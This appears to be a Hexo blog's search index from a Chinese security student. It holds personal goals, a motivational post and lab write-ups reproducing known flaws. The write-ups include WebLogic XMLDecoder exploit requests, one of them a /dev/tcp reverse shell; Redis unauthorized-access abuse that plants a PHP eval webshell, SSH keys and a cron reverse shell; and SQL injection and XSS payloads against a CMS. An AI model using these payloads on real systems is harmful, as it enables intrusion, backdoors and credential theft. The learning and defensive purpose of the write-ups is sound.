<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>首页</title>
    <url>/2022/11/07/index1/</url>
    <content><![CDATA[<h1 id="个人介绍"><a href="#个人介绍" class="headerlink" title="个人介绍"></a>个人介绍</h1><p>静下心来，听到的东西就越多</p>
<h1 id="刷题平台"><a href="#刷题平台" class="headerlink" title="刷题平台"></a>刷题平台</h1><p>1.<a href="https://buuoj.cn/">BUUCTF</a></p>
<p>2.<a href="https://adworld.xctf.org.cn/home/index">攻防世界</a></p>
<p>3.<a href="https://ctf.show/">ctfshow</a></p>
<p>4.<a href="https://ctf.bugku.com/">bugku</a></p>
<p>5.<a href="https://vulfocus.cn/">内网-volfocus</a></p>
<p>6.<a href="http://vulnstack.qiyuanxuetang.net/">内网-VulnStack</a></p>
<p>7.<a href="https://github.com/crow821/vulntarget">渗透环境-vulntarget</a></p>
<h1 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h1><ul>
<li>2022<ul>
<li>完成攻防演练（后悔了，干到八月没实习了）</li>
<li>2022国赛分赛区二等奖（雪佬带飞）</li>
<li>2022祥云杯三等奖（大佬都去社会组，做个小题就进高校组了&#x3D;-&#x3D;）</li>
</ul>
</li>
<li>2023（预开始）<ul>
<li>预计用GO开发出一款工具</li>
<li>挖SRC奖金到3k</li>
<li>代码审计审50个cms</li>
<li>争取干进day1团队</li>
</ul>
</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>每日一看</title>
    <url>/2022/11/07/%E6%AF%8F%E6%97%A5%E4%B8%80%E7%9C%8B/</url>
    <content><![CDATA[<p><strong>每天一遍摆烂再见，4个方法快速进入学习状态！</strong></p>
<h1 id="1、停止自责、停止过度担忧"><a href="#1、停止自责、停止过度担忧" class="headerlink" title="1、停止自责、停止过度担忧"></a><strong>1、停止自责、停止过度担忧</strong></h1><p><strong>1.告诉自己大多数情况下，压垮你的并不是事情本身，而是你的情绪。</strong></p>
<p><strong>2.内耗就是自己和自己斗争。</strong></p>
<p><strong>3.请给自己正向的心理暗示，</strong>反正消极改变不了现状，不如去试一试，万一做成了，自己太厉害了;万一没成功，自己努力过了，至少不会后悔。</p>
<p><strong>4.逆袭的人那么多，凭什么不能是你。</strong></p>
<h1 id="2、五秒法则"><a href="#2、五秒法则" class="headerlink" title="2、五秒法则"></a>2、五秒法则</h1><p><strong>1.适合拖延症晚期的同学。</strong></p>
<p><strong>2.很多事做起来还好，就是开始太难了！</strong></p>
<p><strong>3.每一次你有什么想做的事，倒数5秒54321，马上行动，不要留给自己纠结犹豫的时间。</strong></p>
<p>比如，早上起床应该在第一个闹钟响后，马上54321然后起床！</p>
<h1 id="3、把想做的事具体化"><a href="#3、把想做的事具体化" class="headerlink" title="3、把想做的事具体化"></a>3、把想做的事具体化</h1><p><strong>焦虑的反义词是具体！</strong></p>
<p><strong>1.把要做的事情写下来，然后一步一步的去执行它。把事情分步骤执行，就会感觉到具体而充实。</strong></p>
<p><strong>2.比如面临很重要的考试，</strong></p>
<p>第一步:买书。买什么书？买什么资料？画多少钱？</p>
<p>第二步上课。上什么课？上谁的课？上多久？</p>
<p>第三步，做题。做真题还是模拟题？买哪种题？</p>
<p>然后一步一步的去执行它。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p><strong>努力的过程一定是孤独的，如果你想要得到你想要的，就注定要经过一段沉默黑暗的时光。</strong></p>
<p><strong>要学会马上行动、延迟满足、进入良性循环。</strong></p>
<p><strong>时间就是最公平的东西。</strong></p>
<p><strong>重新出发这件事，任何时候都不迟。</strong></p>
<p><strong>点个赞写下你的目标，明天又是全新的一天！</strong></p>
]]></content>
  </entry>
  <entry>
    <title>逻辑漏洞挖掘</title>
    <url>/2022/11/20/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/</url>
    <content><![CDATA[<h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>开始学逻辑漏洞挖掘，之前没有相关基础，挖起来比较麻烦，而且时不时还因为工具出错，先找一些小SRC挖掘起来，就从低危开始吧！</p>
]]></content>
      <categories>
        <category>渗透测试</category>
        <category>逻辑漏洞</category>
      </categories>
  </entry>
  <entry>
    <title>Weblogic漏洞</title>
    <url>/2022/11/08/weblogic/</url>
    <content><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p><strong>Weblogic是基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。常用端口为7001。</strong></p>
<h1 id="0x01-弱口令"><a href="#0x01-弱口令" class="headerlink" title="0x01 弱口令"></a>0x01 弱口令</h1><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>进入vulhub的目录下weak_password并开启</p>
<p><img src="https://s2.loli.net/2022/11/08/KcRmQUkxBvi7EXI.png" alt="image.png"></p>
<p>建站开始的账号密码为weblogic&#x2F;Oracle@123，登陆后台</p>
<p>选择部署，然后安装</p>
<p><img src="https://s2.loli.net/2022/11/08/lwVHDzUiMREZvrI.png" alt="image.png"></p>
<p>选择上传文件</p>
<p><img src="https://s2.loli.net/2022/11/08/NnfOWbHTRl24mud.png" alt="image.png"></p>
<p>在此先准备jar</p>
<p>执行jar -cvf c.war shell.jsp生成c.war，并上传war包</p>
<p><img src="https://s2.loli.net/2022/11/08/UJb13ikzOI2aWVs.png" alt="image.png"></p>
<p>一直Next到此步骤即可</p>
<p><img src="https://s2.loli.net/2022/11/08/rY9uN8tvqmge7bA.png" alt="image.png"></p>
<p>冰蝎连接</p>
<p><img src="https://s2.loli.net/2022/11/08/TDWj1n2KOumozE5.png" alt="image.png"></p>
<h1 id="0x02-CVE-2017-3506"><a href="#0x02-CVE-2017-3506" class="headerlink" title="0x02 CVE-2017-3506"></a>0x02 CVE-2017-3506</h1><h2 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>构造SOAP（XML）格式的请求，在解析的过程中导致XMLDecoder反序列化漏洞</p>
<h2 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>该漏洞版本为10.3.6.0, 12.1.3.0, 12.2.1.0, 12.2.1.1 and 12.2.1.2。</p>
<p>在浏览器中访问<a href="http://xx.xx.xx.xx:7001/wls-wsat/CoordinatorPortType">http://xx.xx.xx.xx:7001/wls-wsat/CoordinatorPortType</a></p>
<p><img src="https://s2.loli.net/2022/11/08/IR7YDpVie3lsU5P.png" alt="image.png"></p>
<p>对该页面进行burp抓包放到repeater中</p>
<p><img src="https://s2.loli.net/2022/11/08/GqkCHRPEwIM8Wgx.png" alt="image.png"></p>
<p><strong>重新构造数据包</strong></p>
<p>更换请求方式为post，修改Content-Type为text&#x2F;xml，并贴入以下内容作为POST的data部分。这个PoC等同于命令：&#x2F;bin&#x2F;bash -c “touch &#x2F;tmp&#x2F;123”</p>
<pre><code>&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;  
  &lt;soapenv:Header&gt;  
    &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;  
        &lt;java version=&quot;1.8.0_131&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;  
          &lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;  
            &lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;  
              &lt;void index=&quot;0&quot;&gt;  
                &lt;string&gt;/bin/bash&lt;/string&gt;  
             &lt;/void&gt;  
              &lt;void index=&quot;1&quot;&gt;  
                &lt;string&gt;-c&lt;/string&gt;  
             &lt;/void&gt;  
             &lt;void index=&quot;2&quot;&gt;  
                &lt;string&gt;touch /tmp/123&lt;/string&gt;  
             &lt;/void&gt;  
            &lt;/array&gt;  
          &lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;  
        &lt;/java&gt;  
      &lt;/work:WorkContext&gt;  
    &lt;/soapenv:Header&gt;  
  &lt;soapenv:Body/&gt;  
&lt;/soapenv:Envelope&gt;
</code></pre>
<p><img src="https://s2.loli.net/2022/11/08/amdCHFeY3ygTIGl.png" alt="image.png"></p>
<h1 id="0x03-CVE-2017-10271"><a href="#0x03-CVE-2017-10271" class="headerlink" title="0x03 CVE-2017-10271"></a><strong>0x03 CVE-2017-10271</strong></h1><h2 id="漏洞原理-2"><a href="#漏洞原理-2" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>WebLogic对POST类型的XML请求未做有效的过滤防范，导致了XMLDecoder反序列化漏洞</p>
<h2 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>访问 <a href="http://xx.xx.xx.xx:7001/wls-wsat/CoordinatorPortType11%EF%BC%8C%E5%9B%9E%E6%98%BE%E5%88%99%E5%AD%98%E5%9C%A8%E6%BC%8F%E6%B4%9E">http://xx.xx.xx.xx:7001/wls-wsat/CoordinatorPortType11，回显则存在漏洞</a></p>
<p><img src="https://s2.loli.net/2022/11/08/q4jKisubFAIBDcX.png" alt="image.png"></p>
<p>更换请求方式为post，修改Content-Type为text&#x2F;xml，并贴入以下内容作为POST的data部分。写入test.txt</p>
<pre><code>POST /wls-wsat/CoordinatorPortType11 HTTP/1.1  
Host: 192.168.50.173:7001  
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8  
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2  
Accept-Encoding: gzip, deflate  
DNT: 1  
Connection: close  
Content-Type: text/xml  
Upgrade-Insecure-Requests: 1  
 
&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;  
     &lt;soapenv:Header&gt;  
        &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;  
         &lt;java version=&quot;1.6.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;  
                    &lt;object class=&quot;java.io.PrintWriter&quot;&gt;   
                       &lt;string&gt;servers/AdminServer/tmp/_WL_internal/wls-wsat/54p17w/war/test.txt&lt;/string&gt;&lt;void method=&quot;println&quot;&gt;  
                        &lt;string&gt;xmldecoder_vul_test&lt;/string&gt;&lt;/void&gt;&lt;void method=&quot;close&quot;/&gt;  
                    &lt;/object&gt;  
            &lt;/java&gt;  
        &lt;/work:WorkContext&gt;  
      &lt;/soapenv:Header&gt;  
      &lt;soapenv:Body/&gt;  
&lt;/soapenv:Envelope&gt;
</code></pre>
<p>访问<a href="http://192.168.50.173:7001/wls-wsat/test.txt">http://192.168.50.173:7001/wls-wsat/test.txt</a></p>
<p><img src="https://s2.loli.net/2022/11/08/eFHTosAQWNLaxP1.png" alt="image.png"></p>
<h1 id="0x04-CVE-2019-2725"><a href="#0x04-CVE-2019-2725" class="headerlink" title="0x04 CVE-2019-2725"></a><strong>0x04 CVE-2019-2725</strong></h1><h2 id="漏洞原理-3"><a href="#漏洞原理-3" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p><strong>wls-ws反序列化漏洞(CVE-2019-2725)。攻击者可以发送有意构造的恶意HTTP请求，在未授权的情况下执行远程命令。</strong></p>
<p><strong>漏洞触发点：bea_wls9_async_response.war、wsat.war</strong></p>
<p><strong>影响版本：Oracle WebLogic Server 10.* 、Oracle WebLogic Server 12.1.3</strong></p>
<h2 id="漏洞复现-3"><a href="#漏洞复现-3" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>访问<a href="http://xx.xx.xx.xx:7001/async/AsyncResponseService%EF%BC%8C%E5%88%99%E5%AD%98%E5%9C%A8%E6%BC%8F%E6%B4%9E">http://xx.xx.xx.xx:7001/async/AsyncResponseService，则存在漏洞</a></p>
<p><img src="https://s2.loli.net/2022/11/08/OiE925pkAXlR17g.png" alt="image.png"></p>
<p>POC如下</p>
<pre><code>&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:wsa=&quot;http://www.w3.org/2005/08/addressing&quot;
xmlns:asy=&quot;http://www.bea.com/async/AsyncResponseService&quot;&gt;
&lt;soapenv:Header&gt;
&lt;wsa:Action&gt;xx&lt;/wsa:Action&gt;
&lt;wsa:RelatesTo&gt;xx&lt;/wsa:RelatesTo&gt;
&lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;
&lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;
&lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;
&lt;void index=&quot;0&quot;&gt;
&lt;string&gt;/bin/bash&lt;/string&gt;
&lt;/void&gt;
&lt;void index=&quot;1&quot;&gt;
&lt;string&gt;-c&lt;/string&gt;
&lt;/void&gt;
&lt;void index=&quot;2&quot;&gt;
&lt;string&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.50.239/5555 0&amp;gt;&amp;amp;1&lt;/string&gt;
&lt;/void&gt;
&lt;/array&gt;
&lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;
&lt;/work:WorkContext&gt;
&lt;/soapenv:Header&gt;
&lt;soapenv:Body&gt;
&lt;asy:onAsyncDelivery/&gt;
&lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;
</code></pre>
<p><img src="https://s2.loli.net/2022/11/08/BkLmJMs9CARpEX8.png" alt="image.png"></p>
<p>POC适用于Linux系统，Window版本可以使用Java反序列化工具上传shell</p>
]]></content>
      <categories>
        <category>渗透测试</category>
        <category>Nday复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis漏洞</title>
    <url>/2022/11/08/Redis/</url>
    <content><![CDATA[<h1 id="0x00-基础"><a href="#0x00-基础" class="headerlink" title="0x00 基础"></a>0x00 基础</h1><p>Redis是一个开源的、使用C语言编写的、支持网络交互的、可基于内存也可持久化的Key-Value数据库。默认端口为6379</p>
<p>在Centos7上安装</p>
<pre><code>wget http://download.redis.io/releases/redis-6.0.8.tar.gz
tar xzf redis-6.0.8.tar.gz
cd redis-6.0.8
make
cd src  切换到src
cp redis-cli /usr/bins
cp redis-server /usr/bin
</code></pre>
<p>渗透环境</p>
<pre><code>KAli  redis客户端攻击IP：192.168.50.246
Centos redis服务端IP:192.168.50.186
</code></pre>
<p>有关Redis主从复制的文章</p>
<p><a href="https://blog.csdn.net/Cantevenl/article/details/115839649">https://blog.csdn.net/Cantevenl/article/details/115839649</a></p>
<h1 id="0x01-漏洞"><a href="#0x01-漏洞" class="headerlink" title="0x01 漏洞"></a>0x01 漏洞</h1><h2 id="1-未授权访问"><a href="#1-未授权访问" class="headerlink" title="1.未授权访问"></a>1.未授权访问</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>Redis默认情况，会绑定0.0.0.0:6379。如果没有采用相关的策略，如配置防火墙规则避免其他非信任来源的IP访问，就会将Redis服务暴露在公网；没有设置密码认证，会导致任意用户可以访问目标服务器下未授权访问Redis以及读取Redis数据。</p>
<h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>在Centos7编辑Redis配置文件redis.conf，加上#，去掉IP绑定，允许除本地外的主机登录Redis服务</p>
<p><img src="https://s2.loli.net/2022/11/08/hZBIirR2WS6pkXT.png" alt="image.png"></p>
<p>修改protected-mode为no，关闭保护模式，允许远程连接Redis服务</p>
<p>在Centos7开启服务端 </p>
<pre><code>redis-server redis.conf
</code></pre>
<p>在Kali上使用客户端连接</p>
<p><img src="https://s2.loli.net/2022/11/08/EIpOLfbglvd2AR4.png" alt="image.png"></p>
<h2 id="2-写入Webshell"><a href="#2-写入Webshell" class="headerlink" title="2.写入Webshell"></a>2.写入Webshell</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>靶机的Redis存在<strong>未授权访问</strong>，前提如下：</p>
<pre><code>1.开启Web服务
2.Web目录路径
3.文件具有读写增删改查的权限
</code></pre>
<h3 id="复现-1"><a href="#复现-1" class="headerlink" title="复现"></a>复现</h3><p>写入Webshell</p>
<pre><code>192.168.50.186:6379&gt; config set dir /var/www/html
OK
192.168.50.186:6379&gt; config set dbfilename l5.php
OK
192.168.50.186:6379&gt; set webshell &quot;&lt;?php @eval($_POST[1]);?&gt;&quot;
OK
192.168.50.186:6379&gt; save
</code></pre>
<p>写入一句话</p>
<p><img src="https://s2.loli.net/2022/11/08/y1Xc9usjONren3Q.png" alt="image.png"></p>
<p>用蚁剑连接</p>
<p><img src="https://s2.loli.net/2022/11/08/M4DKxnEkPovf6ep.png" alt="image.png"></p>
<h2 id="3-密钥登录SSH"><a href="#3-密钥登录SSH" class="headerlink" title="3.密钥登录SSH"></a>3.密钥登录SSH</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>在数据库插入一条数据，将本机的公钥作为Value，key值随意，修改数据库的默认路径为&#x2F;root&#x2F;.ssh和默认的缓冲文件authorized.keys,在服务器端的&#x2F;root&#x2F;.ssh下生成一个授权的key</p>
<h3 id="复现-2"><a href="#复现-2" class="headerlink" title="复现"></a>复现</h3><p>利用条件</p>
<pre><code>1.Redis和ssh对外开放
2.未授权状态
3.可以通过key登录
</code></pre>
<p>Kali创建ssh-rsa密钥</p>
<p><img src="https://s2.loli.net/2022/11/08/ehMkn2Y3rF8qzS7.png" alt="image.png"></p>
<p>将公钥导入key.txt并写入</p>
<pre><code>(echo -e &quot;\n\n&quot;;cat id_rsa.pub;echo -e &quot;\n\n&quot;) &gt; key.txt
</code></pre>
<p><img src="https://s2.loli.net/2022/11/08/CYcf9MH5K8IGpTb.png" alt="image.png"></p>
<p>设置路径和保存的文件，将内存变量导入磁盘文件</p>
<pre><code>config set dir /root/.ssh
config set dbfilename authorized_keys
save
</code></pre>
<p><img src="https://s2.loli.net/2022/11/08/TZfnq9RH13t7dhs.png" alt="image.png"></p>
<p>Kali用ssh连接靶机</p>
<p><img src="https://s2.loli.net/2022/11/08/dxBR3UnipGtDZ2J.png" alt="image.png"></p>
<h2 id="4-crontab反弹shell"><a href="#4-crontab反弹shell" class="headerlink" title="4.crontab反弹shell"></a>4.crontab反弹shell</h2><h3 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h3><h3 id="复现-3"><a href="#复现-3" class="headerlink" title="复现"></a>复现</h3><pre><code>192.168.50.186:6379&gt; set xx &quot;\n*****bash -i &gt;&amp; /dev/tcp/192.168.50.186/9999 0&gt;&amp;1\n&quot;
192.168.50.186:6379&gt; config set dir /var/spool/cron
192.168.50.186:6379&gt; config set dbfilename root
192.168.50.186:6379&gt; save
</code></pre>
<p>并在kali上监听9999（不过后续没有完成）</p>
<h2 id="5-远程主从复制RCE"><a href="#5-远程主从复制RCE" class="headerlink" title="5.远程主从复制RCE"></a>5.远程主从复制RCE</h2><h3 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h3><p>主从模式就是指使用一个redis实例作为主机，其他实例都作为备份机，其中主机和从机数据相同，而从机只负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式</p>
<p><strong>影响范围：</strong></p>
<p>在Redis的4.X和5.X版本皆可使用</p>
<h3 id="复现-4"><a href="#复现-4" class="headerlink" title="复现"></a>复现</h3><p>下载Redis-rogue-server</p>
<p><img src="https://s2.loli.net/2022/11/08/slbRaXKnECjf8yt.png" alt="image.png"></p>
<p>运行脚本后i为交互式shell,r为反弹shell</p>
<p><img src="https://s2.loli.net/2022/11/08/EDdzUp2axQLZMJh.png" alt="image.png"></p>
<p>反弹shell如下，根据提示输入Ip，与监听的端口</p>
<p><img src="https://s2.loli.net/2022/11/08/QRfkrPaAbNuVpnF.png" alt="image.png"></p>
]]></content>
      <categories>
        <category>渗透测试</category>
        <category>Nday复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>熊海cms v1.0整站审计</title>
    <url>/2022/11/08/xhcms/</url>
    <content><![CDATA[<h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>早上11点起来，准备把新手入门的熊海cms代审一遍，结果一点就得去练车了，到现在才写完，懒狗！</p>
<p>整个站主要功能都在管理员，用户页面挺少功能，而且也不是什么框架，就是拿seay扫都能扫出一大堆洞，不然怎么叫新手洞呢</p>
<p>Mysql账号密码 l3&#x2F;Qwerty123</p>
<p>Admin账号密码 admin&#x2F;Qwerty123</p>
<h1 id="0x02-漏洞"><a href="#0x02-漏洞" class="headerlink" title="0x02 漏洞"></a>0x02 漏洞</h1><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>index.php和&#x2F;admin&#x2F;index.php一致</p>
<pre><code>&lt;?php
//单一入口模式
error_reporting(0); //关闭错误显示
$file=addslashes($_GET[&#39;r&#39;]); //接收文件名
$action=$file==&#39;&#39;?&#39;index&#39;:$file; //判断为空或者等于index
include(&#39;files/&#39;.$action.&#39;.php&#39;); //载入相应文件
?&gt;
</code></pre>
<p>只对参数进行addslashes转义，没有过滤，任意文件包含</p>
<p><img src="https://s2.loli.net/2022/11/08/psURTmxXqy1Oegb.png" alt="image.png"></p>
<h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p>&#x2F;admin&#x2F;files&#x2F;login.php</p>
<pre><code>$login=$_POST[&#39;login&#39;];
$user=$_POST[&#39;user&#39;];
$password=$_POST[&#39;password&#39;];
$checkbox=$_POST[&#39;checkbox&#39;];

if ($login&lt;&gt;&quot;&quot;)&#123;
$query = &quot;SELECT * FROM manage WHERE user=&#39;$user&#39;&quot;;
$result = mysql_query($query) or die(&#39;SQL语句有误：&#39;.mysql_error());
$users = mysql_fetch_array($result);

if (!mysql_num_rows($result)) &#123;  
echo &quot;&lt;Script language=JavaScript&gt;alert(&#39;抱歉，用户名或者密码错误。&#39;);history.back();&lt;/Script&gt;&quot;;
exit;
&#125;else&#123;
$passwords=$users[&#39;password&#39;];
if(md5($password)&lt;&gt;$passwords)&#123;
echo &quot;&lt;Script language=JavaScript&gt;alert(&#39;抱歉，用户名或者密码错误。&#39;);history.back();&lt;/Script&gt;&quot;;
exit; 
  &#125;
</code></pre>
<blockquote>
<p>传递user和password，并未进行过滤</p>
</blockquote>
<blockquote>
<p>·进行user查询，存在user的话就继续password的md5比较，与数据库的比对</p>
</blockquote>
<p>在user这进行admin报错注入，由于回显的md5值不对，需进行两次注入才能得到密码</p>
<pre><code>admin&#39; or extractvalue(1,concat((select concat(0x7e,password) from manage)))#
admin&#39; or extractvalue(1,concat((select concat(password,0x7e) from manage)))#
</code></pre>
<p><img src="https://s2.loli.net/2022/11/08/Gblt7kPSf36IFzg.png" alt="image.png"></p>
<p>&#x2F;admin&#x2F;files&#x2F;newlink.php</p>
<pre><code>$save=$_POST[&#39;save&#39;];
$name=$_POST[&#39;name&#39;];
$url=$_POST[&#39;url&#39;];
$mail=$_POST[&#39;mail&#39;];
$jieshao=$_POST[&#39;jieshao&#39;];
$xs=$_POST[&#39;xs&#39;];

$query = &quot;INSERT INTO link (name,url,mail,jieshao,xs,date) VALUES (&#39;$name&#39;,&#39;$url&#39;,&#39;$mail&#39;,&#39;jieshao&#39;,&#39;xs&#39;,now())&quot;;
</code></pre>
<p>插入语句也并未过滤，使用报错注入</p>
<pre><code>&#39; or updatexml(1,concat(1,(select concat(0x7e,password,0x7e) from manage)),1) or &#39;
</code></pre>
<p>&#x2F;admin&#x2F;files&#x2F;columnlist.php和&#x2F;admin&#x2F;files&#x2F;columentlist.php一样</p>
<h2 id="越权"><a href="#越权" class="headerlink" title="越权"></a>越权</h2><p>&#x2F;inc&#x2F;checklogin.php</p>
<pre><code>&lt;?php
$user=$_COOKIE[&#39;user&#39;];
if ($user==&quot;&quot;)&#123;
header(&quot;Location: ?r=login&quot;);
exit;   
&#125;
?&gt;
</code></pre>
<p><img src="https://s2.loli.net/2022/11/08/WRoezsrbNkAKJat.png" alt="image.png"></p>
<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>反射XSS，在&#x2F;files&#x2F;contact.php</p>
<pre><code>$page=addslashes($_GET[&#39;page&#39;]); 
</code></pre>
<p>仅仅转义，不够</p>
<p><img src="https://s2.loli.net/2022/11/08/haMYfngr1VzyPGB.png" alt="image.png"></p>
<p>存储XSS，在&#x2F;admin&#x2F;files&#x2F;manageinfo.php</p>
<pre><code>$user=$_POST[&#39;user&#39;];
$name=$_POST[&#39;name&#39;];
$password=$_POST[&#39;password&#39;];
$password2=$_POST[&#39;password2&#39;];
$img=$_POST[&#39;img&#39;];
$mail=$_POST[&#39;mail&#39;];
$qq=$_POST[&#39;qq&#39;];
</code></pre>
<p>将语句写入到服务器中</p>
<pre><code>&lt;img src=1 onerror=alert(&quot;xss&quot;)&gt;
</code></pre>
<p><img src="https://s2.loli.net/2022/11/08/dwQkzHiFrNOe96R.png" alt="image.png"></p>
<h2 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h2><p><a href="https://blog.csdn.net/lleo1/article/details/120515505">https://blog.csdn.net/lleo1/article/details/120515505</a></p>
<p><a href="https://blog.csdn.net/weixin_44604541/article/details/118602925">https://blog.csdn.net/weixin_44604541/article/details/118602925</a></p>
]]></content>
      <categories>
        <category>渗透测试</category>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>2022/11/07</title>
    <url>/2022/11/07/%E6%97%A5%E8%AE%B0-20221007/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="56bdd89032140c402cf900c368f06cf1473d4e14d3760b7bb58d42d57fda6f6b">6d0774511472fc40695ef1e6d1064748da5950ab62a53117c6219be8249a3249fcdff60b5f240e0e4bc2704ffbd86510a22fd949f48abfdab52acc5c7d5d0d5316665672bfbd8da39809903df81f1219a8c9de4c40ccc4786be150fa7b3b5192cd9f1351d15f05ef2ceb9566c32e68051def3fbe8583a4e94bbab969fd5d960f85ded2c3cd7127772b6b03e908062ed1759e54f7517981c4ccacfe1e42c21ea8df7a9f0324f20cc55b3c0b0d009396ec12eed63feb682c2c34d0e1e7743b7f77a6624e7375f159723a3d459ee5c1aff0360829fda57dc9ba795d44d8078c58eae0978c535dfbc2b8f2e54dbbf0632dd74485774ba839daac10ddd0cd6aa8ed838139a8c505f0e82e4f1e9230cd4c4a40a77dd703c368faa39cd84f8be33a54593904832994702bc8408367723a24fdb976f6cba7deb636b963fe9df3e2471d4d63806d02c8cad3528f126322e1b94d1ad08d60ee064c275de86438818913d97b93f3a2bdd7ea4500d37d53b8129a48e95b08fbf6e7be2b3b2c2ba6575d5e1d9bc2e0e47610bc0ceb375b3e35ddf01bbc7fb6151a07a33d049762ef44b03abbead789a6a492eb7356f176212d8c361dde70f6a78ba31db5fd757a76f869355d37ba6e750d514b3cc71566254af84642ea464183c90848176d370ae3412d6dee62676c34ebcc02d31450ce250fe08dd4b83a4cb9531406889b92252aa67f0ba4ab1334a0aa1d13f3590f88e748fd8b91f72934d805c0cd6ad343d1250947fee8e748d53a91e9cf1f98e7b9e327819cec2d5f8fe07bfd3dc6a3dcdffc859e799fbae669ae4f2f286b84089c2cba8d367f8a</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>日记</category>
      </categories>
  </entry>
  <entry>
    <title>[靶场练习]vulntarget-a</title>
    <url>/2022/11/04/vulntarget-a/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>设置vmware的双网卡必须匹配一致</p>
<pre><code>1.web7 

开机密码admin

2.win2016 

开机密码 Admin#123

管理员 Administrator/Admin@666

 3.Win2019

开机密码Admin@666
</code></pre>
<h1 id="外网渗透"><a href="#外网渗透" class="headerlink" title="外网渗透"></a>外网渗透</h1><h2 id="OA文件包含"><a href="#OA文件包含" class="headerlink" title="OA文件包含"></a>OA文件包含</h2><p>扫描端口发现80端口</p>
<p><img src="https://s2.loli.net/2022/11/04/WlRN2qSwuMHyPTJ.png" alt="image.png"></p>
<p>查看网站为OA系统</p>
<p><img src="https://s2.loli.net/2022/11/04/luaVfbCq7S4p5TK.png" alt="image.png"></p>
<p>文件包含拿webshell</p>
<p><img src="https://s2.loli.net/2022/11/04/sTUxDMRHP8ZnVLN.png" alt="image.png"></p>
<p>蚁剑连接</p>
<p><img src="https://s2.loli.net/2022/11/04/ElRdqpjciaBVTPx.png" alt="image.png"></p>
<p>上线CS</p>
